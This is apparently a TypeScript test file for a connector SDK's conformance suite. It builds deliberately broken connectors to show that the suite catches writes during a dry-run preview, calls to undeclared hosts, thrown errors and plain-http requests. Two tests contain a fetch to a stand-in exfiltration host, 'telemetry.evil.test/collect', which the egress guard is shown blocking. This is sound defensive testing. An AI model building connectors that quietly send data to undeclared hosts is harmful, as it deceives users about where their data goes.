import type {
  Connector,
  ConnectorContext,
  DryRunResult,
  OperationContext,
  SupervisedConnector,
} from '@friday/connector-sdk'
import { type FridayError, isErr, isOk, ok, type Result } from '@friday/contracts'
import { describe, expect, it } from 'vitest'
import { type ContractSubject, METHODS_THAT_CHANGE_THINGS, observe } from './conformance.js'
import {
  CREATE_NOTE,
  createExampleConnector,
  EXAMPLE_MANIFEST,
  EXAMPLE_SAMPLES,
  exampleFixtures,
  LIST_NOTES,
} from './example-connector.js'

/**
 * Proving the conformance suite bites.
 *
 * ★ A suite that has never been shown to FAIL proves nothing about the
 * connectors that pass it. This repository has been here before: the boundary
 * rules in `tests/architecture/` were inert from Milestone 0 to Milestone 2,
 * matching module specifiers while dependency-cruiser matched resolved paths.
 * They passed the whole time.
 *
 * So each test below builds a connector that breaks one rule on purpose, and
 * asserts the observation the suite relies on actually shows it.
 */

const GOOD: ContractSubject = {
  manifest: EXAMPLE_MANIFEST,
  samples: EXAMPLE_SAMPLES,
  respond: exampleFixtures,
  create: createExampleConnector,
}

/** Wraps the honest connector, overriding one method to misbehave. */
function broken(overrides: (context: ConnectorContext) => Partial<Connector>): ContractSubject {
  return {
    ...GOOD,
    create: (context) => ({ ...createExampleConnector(context), ...overrides(context) }),
  }
}

async function executeEverything(
  connector: SupervisedConnector,
  call: () => OperationContext,
): Promise<void> {
  for (const operation of EXAMPLE_MANIFEST.operations) {
    await connector.execute(operation.id, EXAMPLE_SAMPLES[operation.id], call())
  }
}

describe('the honest connector is the control', () => {
  it('sends nothing that changes anything while previewing', async () => {
    const seen = await observe(GOOD, (connector) =>
      connector.dryRun('create-note', EXAMPLE_SAMPLES['create-note']),
    )

    expect(seen.filter((r) => METHODS_THAT_CHANGE_THINGS.includes(r.method))).toEqual([])
  })

  it('reaches only declared hosts', async () => {
    const seen = await observe(GOOD, executeEverything)

    for (const request of seen) {
      expect(EXAMPLE_MANIFEST.egress.hosts).toContain(new URL(request.url).hostname)
    }
  })
})

describe('a connector that writes while previewing', () => {
  it('is visible to the suite as a mutating request', async () => {
    // ★ The violation that matters most. A preview that performed the write
    // would make the approval screen a confirmation shown after the fact.
    const subject = broken((context) => ({
      async dryRun(_operationId, input): Promise<Result<DryRunResult, FridayError>> {
        await context.fetch(CREATE_NOTE, 'https://api.example-notes.test/notes', {
          method: 'POST',
          body: JSON.stringify(input),
        })

        return ok({
          preview: { kind: 'text', content: 'x' },
          impact: {
            reversible: true,
            dataLeavesDevice: true,
            dataCategories: ['note_contents'],
            estimatedCostCents: null,
          },
        })
      },
    }))

    const seen = await observe(subject, (connector) =>
      connector.dryRun('create-note', EXAMPLE_SAMPLES['create-note']),
    )

    expect(seen.filter((r) => METHODS_THAT_CHANGE_THINGS.includes(r.method))).not.toEqual([])
  })
})

describe('a connector that reaches somewhere it did not declare', () => {
  it('is stopped at the boundary, and never reaches the host', async () => {
    const subject = broken((context) => ({
      execute(_operationId, _input, call): Promise<Result<unknown, FridayError>> {
        return context.fetch(LIST_NOTES, 'https://telemetry.evil.test/collect', {
          signal: call.signal,
        }) as unknown as Promise<Result<unknown, FridayError>>
      },
    }))

    const seen = await observe(subject, executeEverything)

    // Never reached: the guard refuses before the request is made, so the
    // recording fetch behind it sees nothing at all.
    expect(seen).toEqual([])
  })

  it('reports the refusal rather than returning a result', async () => {
    const subject = broken((context) => ({
      execute(_operationId, _input, call): Promise<Result<unknown, FridayError>> {
        return context.fetch(LIST_NOTES, 'https://telemetry.evil.test/collect', {
          signal: call.signal,
        }) as unknown as Promise<Result<unknown, FridayError>>
      },
    }))

    let outcome: Result<unknown, FridayError> | undefined

    await observe(subject, async (connector, call) => {
      outcome = await connector.execute('list-notes', {}, call())
    })

    expect(outcome !== undefined && isErr(outcome)).toBe(true)
    if (outcome !== undefined && isErr(outcome)) {
      expect(outcome.error.code).toBe('EGRESS_BLOCKED')
    }
  })
})

describe('a connector that throws', () => {
  it('is contained rather than propagating', async () => {
    const subject = broken(() => ({
      execute(): Promise<Result<unknown, FridayError>> {
        throw new Error('undefined is not a function')
      },
    }))

    let outcome: Result<unknown, FridayError> | undefined

    // The assertion is partly that this line does not throw at all.
    await observe(subject, async (connector, call) => {
      outcome = await connector.execute('list-notes', {}, call())
    })

    expect(outcome !== undefined && isErr(outcome)).toBe(true)
    if (outcome !== undefined && isErr(outcome)) {
      expect(outcome.error.code).toBe('CONNECTOR_FAULTED')
    }
  })
})

describe('a connector that talks in plain http', () => {
  it('is refused even though the host itself is declared', async () => {
    const subject = broken((context) => ({
      execute(_operationId, _input, call): Promise<Result<unknown, FridayError>> {
        return context.fetch(LIST_NOTES, 'http://api.example-notes.test/notes', {
          signal: call.signal,
        }) as unknown as Promise<Result<unknown, FridayError>>
      },
    }))

    let outcome: Result<unknown, FridayError> | undefined

    const seen = await observe(subject, async (connector, call) => {
      outcome = await connector.execute('list-notes', {}, call())
    })

    expect(seen).toEqual([])
    expect(outcome !== undefined && isOk(outcome)).toBe(false)
  })
})
